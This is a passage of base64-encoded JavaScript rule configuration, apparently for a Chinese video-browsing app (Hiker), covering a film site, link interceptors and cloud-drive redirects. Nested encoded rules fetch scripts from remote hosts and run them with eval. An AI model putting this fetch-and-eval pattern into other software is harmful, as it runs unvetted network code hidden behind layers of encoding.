ICAgICAgICBzZXRUaW1lb3V0KHdpbmRvdy5jaGVjazAsIDI1MCk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgd2luZG93LmNoZWNrYyA9IDA7XFxuICAgICAgICAgICAgd2luZG93LmNoZWNrMCA9IGNoZWNrMDtcXG4gICAgICAgICAgICBjaGVjazAoKTtcXG4gICAgICAgIH1cXG4gICAgfSwgcnVsZSwgYW5jaG9ySWQsIHN0b3JhZ2UwLmdldEl0ZW0oXFxcIndoaXRlXFxcIiwgW10pKTtcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLpppbpobVcIixcInBhdGhcIjpcImhvbWVcIixcInJ1bGVcIjpcInZhciBkID0gW107XFxubGV0IHVybCA9IOe9keermTtcXG5sZXQgYW5jaG9ySWQgPSB1cmw7XFxubGV0IGpzID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UveDVhaVxcXCIpKE1ZX1JVTEUudGl0bGUsIGFuY2hvcklkKTtcXG5sZXQgaXRlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvdVxcXCIpKE1ZX1JVTEUudGl0bGUsIGdldEhvbWUodXJsKSk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCJcXFwiLFxcbiAgICB1cmw6IHVybCxcXG4gICAgY29sX3R5cGU6IFxcXCJ4NV93ZWJ2aWV3X3NpbmdsZVxcXCIsXFxuICAgIGRlc2M6IFxcXCIxMDAlJiZmbG9hdFxcXCIsXFxuICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgdXJsSW50ZXJjZXB0b3I6IGl0ZSxcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxuICAgICAgICBqczoganMsXFxuICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWVcXG4gICAgfVxcbn0pO1xcbmQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICBpZDogYW5jaG9ySWRcXG4gICAgfVxcbn0pO1xcblxcbnNldFJlc3VsdChkKTtcIn1dLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCJMSUJWSU/op4LlvbHnvZHnq5lcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL3BhZ2UveXNmeD9ydWxlPUxJQlZJT+inguW9see9keermSZyPUxJQlZJT+inguW9see9keermSMjaHR0cHM6Ly93d3cubGlidmlvLmNjL3BsYXkvNzE0ODg5ODIzLTEtMS5odG1sXCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczpcXG52YXIgZCA9IFtdO1xcbmxldCBydWxlID0gZ2V0UGFyYW0oXFxcInJcXFwiKS5zcGxpdChcXFwiIyNcXFwiKVswXTtcXG5sZXQgdXJsID0gTVlfVVJMLnNwbGl0KFxcXCIjI1xcXCIpWzFdO1xcbmxldCBpdGUgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS91XFxcIikocnVsZSwgZ2V0SG9tZSh1cmwpKTtcXG5sZXQganMgPSAkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgdHJ5IHtcXG4gICAgICAgIGlmIChkb2N1bWVudC50aXRsZSAmJiBkb2N1bWVudC50aXRsZS5sZW5ndGgpIHtcXG4gICAgICAgICAgICBsZXQgciA9ICQkJCgpLmxhenlSdWxlKCh0KSA9PiB7XFxuICAgICAgICAgICAgICAgIHNldFBhZ2VUaXRsZSh0KTtcXG4gICAgICAgICAgICB9LCBkb2N1bWVudC50aXRsZSk7XFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5wYXJzZUxhenlSdWxlKHIpO1xcbiAgICAgICAgfVxcbiAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICBmeV9icmlkZ2VfYXBwLmxvZyhlLnRvU3RyaW5nKCkpO1xcbiAgICB9XFxufSk7XFxubGV0IGpzMiA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3g1YWlcXFwiKShydWxlLCB1cmwpO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBcXFwiXFxcIixcXG4gICAgdXJsOiB1cmwsXFxuICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICBkZXNjOiBcXFwiMTAwJSYmZmxvYXRcXFwiLFxcbiAgICBwaWNfdXJsOiBcXFwiXFxcIixcXG4gICAgZXh0cmE6IHtcXG4gICAgICAgIHVybEludGVyY2VwdG9yOiBpdGUsXFxuICAgICAgICBqczoganMgKyBcXFwiO1xcXFxuXFxcIiArIGpzMixcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxuICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWUsXFxuICAgICAgICBmbG9hdFZpZGVvOiB0cnVlXFxuICAgIH1cXG59KTtcXG5kLnB1c2goe1xcbiAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgaWQ6IHVybFxcbiAgICB9XFxufSk7XFxuc2V0UmVzdWx0KGQpO1wiLFwiZ3JvdXBcIjpcIuaIkeeahOW4uOeUqFwiLFwidWFcIjpcIm1vYmlsZVwiLFwicHJlUnVsZVwiOlwiXCIsXCJwYWdlc1wiOlwiW3tcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcInlzZnhcXFwiLFxcXCJwYXRoXFxcIjpcXFwieXNmeFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbnZhciBkID0gW107XFxcXG5sZXQgcnVsZSA9IGdldFBhcmFtKFxcXFxcXFwiclxcXFxcXFwiKS5zcGxpdChcXFxcXFxcIiMjXFxcXFxcXCIpWzBdO1xcXFxubGV0IHVybCA9IE1ZX1VSTC5zcGxpdChcXFxcXFxcIiMjXFxcXFxcXCIpWzFdO1xcXFxubGV0IGl0ZSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS91XFxcXFxcXCIpKHJ1bGUsIGdldEhvbWUodXJsKSk7XFxcXG5sZXQganMgPSAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICB0cnkge1xcXFxuICAgICAgICBpZiAoZG9jdW1lbnQudGl0bGUgJiYgZG9jdW1lbnQudGl0bGUubGVuZ3RoKSB7XFxcXG4gICAgICAgICAgICBsZXQgciA9ICQkJCgpLmxhenlSdWxlKCh0KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKHQpO1xcXFxuICAgICAgICAgICAgfSwgZG9jdW1lbnQudGl0bGUpO1xcXFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5wYXJzZUxhenlSdWxlKHIpO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICBmeV9icmlkZ2VfYXBwLmxvZyhlLnRvU3RyaW5nKCkpO1xcXFxuICAgIH1cXFxcbn0pO1xcXFxubGV0IGpzMiA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS94NWFpXFxcXFxcXCIpKHJ1bGUsIHVybCk7XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgIHVybDogdXJsLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcIng1X3dlYnZpZXdfc2luZ2xlXFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCIxMDAlJiZmbG9hdFxcXFxcXFwiLFxcXFxuICAgIHBpY191cmw6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgdXJsSW50ZXJjZXB0b3I6IGl0ZSxcXFxcbiAgICAgICAganM6IGpzICsgXFxcXFxcXCI7XFxcXFxcXFxuXFxcXFxcXCIgKyBqczIsXFxcXG4gICAgICAgIGNhbkJhY2s6IHRydWUsXFxcXG4gICAgICAgIGpzTG9hZGluZ0luamVjdDogdHJ1ZSxcXFxcbiAgICAgICAgZmxvYXRWaWRlbzogdHJ1ZVxcXFxuICAgIH1cXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgaWQ6IHVybFxcXFxuICAgIH1cXFxcbn0pO1xcXFxuc2V0UmVzdWx0KGQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcInVcXFwiLFxcXCJwYXRoXFxcIjpcXFwidVxcXCIsXFxcInJ1bGVcXFwiOlxcXCIkLmV4cG9ydHMgPSBmdW5jdGlvbihydWxlLCBvcmlnaW4pIHtcXFxcbiAgICByZXR1cm4gJC50b1N0cmluZygocnVsZSwgb3JpZ2luKSA9PiB7XFxcXG4gICAgICAgIGxldCBob3N0ID0gb3JpZ2luLnJlcGxhY2UobmV3IFJlZ0V4cChcXFxcXFxcImh0dHA6Ly98aHR0cHM6Ly9cXFxcXFxcIiksIFxcXFxcXFwiXFxcXFxcXCIpLnNwbGl0KFxcXFxcXFwiL1xcXFxcXFwiKVswXTtcXFxcbiAgICAgICAgbGV0IGhvc3RzID0gaG9zdC5zcGxpdChcXFxcXFxcIi5cXFxcXFxcIik7XFxcXG4gICAgICAgIGlmIChob3N0cy5sZW5ndGggPiAyKSB7XFxcXG4gICAgICAgICAgICBob3N0ID0gaG9zdHNbaG9zdHMubGVuZ3RoIC0gMl0gKyBcXFxcXFxcIi5cXFxcXFxcIiArIGhvc3RzW2hvc3RzLmxlbmd0aCAtIDFdO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmIChpbnB1dC5zdGFydHNXaXRoKFxcXFxcXFwibWFnbmV0XFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICBjb25maXJtKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmuKnppqjmj5DnpLpcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBjb250ZW50OiBcXFxcXFxcIuajgOa1i+WIsOaWsOeahOejgemTvuWcsOWdgO+8jOeCueWHu+ehruWumuaMiemSruWNs+WPr+aSreaUvu+8jOeCueWHu+WPlua2iOaMiemSruWPr+S7peWkjeWItumTvuaOpVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGNvbmZpcm06ICQudG9TdHJpbmcoKG1hZykgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gbWFnO1xcXFxuICAgICAgICAgICAgICAgIH0sIGlucHV0KSxcXFxcbiAgICAgICAgICAgICAgICBjYW5jZWw6ICQudG9TdHJpbmcoKG1hZykgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJjb3B5Oi8vXFxcXFxcXCIgKyBtYWdcXFxcbiAgICAgICAgICAgICAgICB9LCBpbnB1dClcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICAgICAgfSBlbHNlIGlmIChpbnB1dC5pbmNsdWRlcyhcXFxcXFxcImFsaXl1bmRyaXZlLmNvbVxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgbG9nKGlucHV0KTtcXFxcbiAgICAgICAgICAgIGxldCByMSA9IGZldGNoKFxcXFxcXFwiaGlrZXI6Ly9ob21lQOS6keebmOaxh+W9sVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGlmICghcjEgfHwgcjEubGVuZ3RoIDw9IDUpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcnUgPSAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwi5rW36ZiU6KeG55WM6KeE5YiZ5YiG5Lqr77yM5b2T5YmN5YiG5Lqr55qE5piv77ya5bCP56iL5bqP77+laG9tZV9ydWxlX3Yy77+lYmFzZTY0Oi8vQOS6keebmOaxh+W9sUBleUpzWVhOMFgyTm9ZWEIwWlhKZmNuVnNaU0k2SWlJc0luUnBkR3hsSWpvaTVMcVI1NXVZNXJHSDViMnhJaXdpWVhWMGFHOXlJam9pVFhKR2JIa2lMQ0oxY213aU9pSm9hV3RsY2pvdkwyVnRjSFI1SkNRa1pubHdZV2RsSWl3aWRtVnljMmx2YmlJNk5pd2lZMjlzWDNSNWNHVWlPaUowWlhoMFh6RWlMQ0pqYkdGemMxOXVZVzFsSWpvaUlpd2lkSGx3WlNJNkltRnNiQ0lzSW1Oc1lYTnpYM1Z5YkNJNklpSXNJbUZ5WldGZmJtRnRaU0k2SWlJc0ltRnlaV0ZmZFhKc0lqb2lJaXdpYzI5eWRGOXVZVzFsSWpvaUlpd2llV1ZoY2w5dVlXMWxJam9pSWl3aWMyOXlkRjkxY213aU9pSWlMQ0o1WldGeVgzVnliQ0k2SWlJc0ltWnBibVJmY25Wc1pTSTZJbXB6T2x4dVpYWmhiQ2htWlhSamFDZ25hR2xyWlhJNkx5OW1hV3hsY3k5eWRXeGxjeTlwWTNrdllXeHBMbXB6SnlrcE8xeHVZV3hwTG1odmJXVlFZV2RsS0NrN0lpd2ljMlZoY21Ob1gzVnliQ0k2SW1ocGEyVnlPaTh2Wlcxd2RIa2tKQ1FxS2lRa0pHWjVjR0ZuWlNRa0pDSXNJbWR5YjNWd0lqb2k0cEdnNTcyUjU1dVlJaXdpYzJWaGNtTm9SbWx1WkNJNkltcHpPbHh1WlhaaGJDaG1aWFJqYUNnbmFHbHJaWEk2THk5bWFXeGxjeTl5ZFd4bGN5OXBZM2t2WVd4cExtcHpKeWtwTzF4dVlXeHBMbk5sWVhKamFGQmhaMlVvZEhKMVpTazdYRzRpTENKa1pYUmhhV3hmWTI5c1gzUjVjR1VpT2lKdGIzWnBaVjh4SWl3aVpHVjBZV2xzWDJacGJtUmZjblZzWlNJNkltcHpPbHh1WlhaaGJDaG1aWFJqYUNnbmFHbHJaWEk2THk5bWFXeGxjeTl5ZFd4bGN5OXBZM2t2WVd4cExtcHpKeWtwTzF4dVlXeHBMbVJsZEdGcGJGQmhaMlVvS1RzaUxDSnpaR1YwWVdsc1gyTnZiRjkwZVhCbElqb2liVzkyYVdWZk1TSXNJbk5rWlhSaGFXeGZabWx1WkY5eWRXeGxJam9pSWl3aWRXRWlPaUp0YjJKcGJHVWlMQ0p3Y21WU2RXeGxJam9pZG1GeUlHRnNhV3B6SUQwZ1ptVjBZMmdvSjJoMGRIQnpPaTh2WjJsMFpXVXVZMjl0TDJac2VURXpPVGN2YUdsclpYSXRhV041TDNKaGR5OXRZWE4wWlhJdllXeHBMbXB6SnlrN1hHNXBaaWdoWVd4cGFuTWdmSHdnSVdGc2FXcHpMbWx1WTJ4MVpHVnpLQ2RoYkdrbktTbDdYRzVjZEdGc2FXcHpJRDBnWm1WMFkyZ29KMmgwZEhCek9pOHZZMlJ1TG1welpHVnNhWFp5TG01bGRDOW5hQzltYkhreE16azNMMmhwYTJWeUxXbGplUzloYkdrdWFuTW5LVnh1ZlZ4dWFXWW9JV0ZzYVdweklIeDhJQ0ZoYkdscWN5NXBibU5zZFdSbGN5Z25ZV3hwSnlrcGUxeHVYSFJoYkdscWN5QTlJR1psZEdOb0tDZG9kSFJ3T2k4dmJHWnBZM2t1WTI5dE9qTXdNREF3TDIxeVpteDVMMmhwYTJWeUxXbGplUzl5WVhjdmJXRnpkR1Z5TDJGc2FTNXFjeWNwWEc1OVhHNXBaaWhoYkdscWN5a2dlMXh1WEhSM2NtbDBaVVpwYkdVb1hDSm9hV3RsY2pvdkwyWnBiR1Z6TDNKMWJHVnpMMmxqZVM5aGJHa3Vhbk5jSWl4aGJHbHFjeWs3WEc1Y2RHVjJZV3dvWVd4cGFuTXBPMXh1WEhSaGJHa3VjSEpsVW5Wc1pTZ3BPMXh1ZlZ4dUlpd2ljR0ZuWlhNaU9pSmJlMXdpWTI5c1gzUjVjR1ZjSWpwY0ltMXZkbWxsWHpOY0lpeGNJbTVoYldWY0lqcGNJdWU5a2VlYm1PaXZwdWFEaFZ3aUxGd2ljR0YwYUZ3aU9sd2laR1YwWVdsc1hDSXNYQ0p5ZFd4bFhDSTZYQ0pxY3pwY1hHNWxkbUZzS0dabGRHTm9LQ2RvYVd0bGNqb3ZMMlpwYkdWekwzSjFiR1Z6TDJsamVTOWhiR2t1YW5NbktTazdYRnh1WVd4cExtbHVhWFJEYjI1bWFXY29LVHRjWEc1aGJHa3VZV3hwVW5Wc1pTZ3BPMXdpZlN4N1hDSmpiMnhmZEhsd1pWd2lPbHdpYlc5MmFXVmZNVjlzWldaMFgzQnBZMXdpTEZ3aWJtRnRaVndpT2x3aTZMV0U1cnFRNTcyUjZhRzE2SyttNW9PRlhDSXNYQ0p3WVhSb1hDSTZYQ0p6YVhSbExXUmxkR0ZwYkZ3aUxGd2ljblZzWlZ3aU9sd2lhbk02WEZ4dVpYWmhiQ2htWlhSamFDZ25hR2xyWlhJNkx5OW1hV3hsY3k5eWRXeGxjeTlwWTNrdllXeHBMbXB6SnlrcE8xeGNibUZzYVM1a1pYUmhhV3hRWVdkbEtDazdYQ0o5TEh0Y0ltTnZiRjkwZVhCbFhDSTZYQ0p0YjNacFpWOHpYQ0lzWENKdVlXMWxYQ0k2WENMa3VLcmt1cnJudlpIbm01am9yNmJtZzRWY0lpeGNJbkJoZEdoY0lqcGNJbVJ5YVhabFhDSXNYQ0p5ZFd4bFhDSTZYQ0pxY3pwY1hHNWxkbUZzS0dabGRHTm9LQ2RvYVd0bGNqb3ZMMlpwYkdWekwzSjFiR1Z6TDJsamVTOWhiR2t1YW5NbktTazdYRnh1WVd4cExtbHVhWFJEYjI1bWFXY29LVHRjWEc1aGJHa3ViWGxCYkdsU2RXeGxLQ2s3WENKOVhTSXNJbWxqYjI0aU9pSm9kSFJ3Y3pvdkwyZHBkR1ZsTG1OdmJTOW1iSGt4TXprM0wyaHBhMlZ5TFdsamVTOXlZWGN2YldGemRHVnlMMkZzYVhsMWJpNXdibWNpZlE9PVxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgY29uZmlybSh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiAn5rip6aao5o+Q56S6JyxcXFxcbiAgICAgICAgICAgICAgICAgICAgY29udGVudDogJ+acrOinhOWImeS+nei1luS6keebmOaxh+W9seinhOWIme+8jOeCueWHu+S4i+mdoueahOehruWumuaMiemSruWvvOWFpe+8jOazqOaEj+WvvOWFpeWQjuS4gOWumuimgeWcqOS6keebmOaxh+W9seeZu+W9lemYv+mHjOS6keebmOi0puWPt++8jOWQpuWImeS4jeiDveeUqCcsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbmZpcm06IHJ1LFxcXFxuICAgICAgICAgICAgICAgICAgICBjYW5jZWw6IHJ1XFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbG9nKFxcXFxcXFwiaW5wdXRcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5vcGVuKEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6Zi/6YeM5LqR55uYXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGV0YWlsP3J1bGU95LqR55uY5rGH5b2xJnVybD1cXFxcXFxcIiArIHVybCArICc/P2Z5cGFnZScsXFxcXG4gICAgICAgICAgICAgICAgfSkpXFxcXG4gICAgICAgICAgICB9LCBpbnB1dCwgcnVsZSlcXFxcbiAgICAgICAgfSBlbHNlIGlmICgvXFxcXFxcXFwuKG1wM3xmbGFjfG00YSkkLy50ZXN0KGlucHV0KSkge1xcXFxuICAgICAgICAgICAgbG9nKGlucHV0KTtcXFxcbiAgICAgICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBsYXlWaWRlbyh1cmwpO1xcXFxuICAgICAgICAgICAgfSwgaW5wdXQsIHJ1bGUpXFxcXG4gICAgICAgIH0gZWxzZSBpZiAoIWlucHV0LmluY2x1ZGVzKGhvc3QpICYmIGlucHV0LnN0YXJ0c1dpdGgoXFxcXFxcXCJodHRwXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICBsb2coaW5wdXQpO1xcXFxuICAgICAgICAgICAgcmV0dXJuICQudG9TdHJpbmcoKHVybCwgcnVsZSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCB3aGl0ZSA9IFtcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJkb3V5aW5cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJkb3ViYW5cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJpeGlndWEuY29tXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwia3VhaXNob3VcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJiaWxpYmlsaVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIndlaWJvXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwid2VpeGluXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiYmFpZHVcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJ6bWsuXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwic3ViaGRcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJ0aHVuZGVyXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwieGluanVjXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiZ3JhYjRrXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiL2J0XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwianNyMTBcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJhc3NydFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcInF1YXJrXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICBdO1xcXFxuICAgICAgICAgICAgICAgIGxldCBpbldoaXRlID0gd2hpdGUuZmlsdGVyKGl0ID0+IHVybC5pbmNsdWRlcyhpdCkpLmxlbmd0aCA+IDA7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGluV2hpdGUpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgLy/ot7PnvZHpobVcXFxcbiAgICAgICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5vcGVuKEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuivpuaDhVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS95c2Z4P3J1bGU9XFxcXFxcXCIgKyBydWxlICsgXFxcXFxcXCImcj1cXFxcXFxcIiArIHJ1bGUgKyBcXFxcXFxcIiMjXFxcXFxcXCIgKyB1cmwsXFxcXG4gICAgICAgICAgICAgICAgICAgIH0pKVxcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIC8vQUnop6PmnpBcXFxcbiAgICAgICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5vcGVuKEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBkb2N1bWVudC50aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UvcD9ydWxlPVxcXFxcXFwiICsgcnVsZSArIFxcXFxcXFwiJnI9XFxcXFxcXCIgKyBydWxlICsgXFxcXFxcXCImdT1cXFxcXFxcIiArIGZ5X2JyaWRnZV9hcHAuYmFzZTY0RW5jb2RlKHVybCksXFxcXG4gICAgICAgICAgICAgICAgICAgIH0pKVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0sIGlucHV0LCBydWxlKTtcXFxcbiAgICAgICAgfSBlbHNlIGlmICghaW5wdXQuc3RhcnRzV2l0aChcXFxcXFxcImh0dHBcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgIGxvZyhpbnB1dCk7XFxcXG4gICAgICAgICAgICAvL+iDveWUpOi1t0FQUOeahOeZveWQjeWNlVxcXFxuICAgICAgICAgICAgbGV0IHdoaXRlID0gW1xcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwicWtsaW5rXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgXFxcXFxcXCJiZG5ldGRpc2tcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBcXFxcXFxcInh1bmxlaWFwcFxcXFxcXFwiXFxcXG4gICAgICAgICAgICBdO1xcXFxuICAgICAgICAgICAgbGV0IGluV2hpdGUgPSB3aGl0ZS5maWx0ZXIoaXQgPT4gaW5wdXQuc3RhcnRzV2l0aChpdCkpLmxlbmd0aCA+IDA7XFxcXG4gICAgICAgICAgICBpZiAoIWluV2hpdGUpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5vcGVuVGhpcmRBcHAgJiYgZnlfYnJpZGdlX2FwcC5vcGVuVGhpcmRBcHAodXJsKTtcXFxcbiAgICAgICAgICAgIH0sIGlucHV0LCBydWxlKVxcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgbGV0IHdoaXRlID0gW1xcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwidXJsPVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwiZnNvdS5jb21cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBcXFxcXFxcImJpbmcuXFxcXFxcXCIsICAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgXTtcXFxcbiAgICAgICAgICAgIGxldCBpbldoaXRlID0gd2hpdGUuZmlsdGVyKGl0ID0+IGlucHV0LmluY2x1ZGVzKGl0KSkubGVuZ3RoID4gMDtcXFxcbiAgICAgICAgICAgIGlmIChpbldoaXRlKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbGV0IHJlZyA9IG5ldyBSZWdFeHAoXFxcXFxcXCJbXFxcXFxcXFx1NGUwMC1cXFxcXFxcXHU5ZmE1XStcXFxcXFxcIiwgXFxcXFxcXCJnXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IHIgPSBkZWNvZGVVUklDb21wb25lbnQoaW5wdXQpO1xcXFxuICAgICAgICAgICAgaWYgKHJlZy50ZXN0KHIpIHx8IChpbnB1dC5zdGFydHNXaXRoKG9yaWdpbikgJiYgaW5wdXQubGVuZ3RoIC0gb3JpZ2luLmxlbmd0aCA+IDIpKSB7XFxcXG4gICAgICAgICAgICAgICAgLy/mnInkuK3mlofvvIzlupTor6XmmK/lnKjmkJzntKLvvIzot7PmlrDpobXpnaJcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2lmeSh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLor6bmg4VcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL3BhZ2UveXNmeD9ydWxlPVxcXFxcXFwiICsgcnVsZSArIFxcXFxcXFwiJnI9XFxcXFxcXCIgKyBydWxlICsgXFxcXFxcXCIjI1xcXFxcXFwiICsgdXJsLFxcXFxuICAgICAgICAgICAgICAgICAgICB9KSk7XFxcXG4gICAgICAgICAgICAgICAgfSwgaW5wdXQsIHJ1bGUpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgfSwgcnVsZSwgb3JpZ2luKTtcX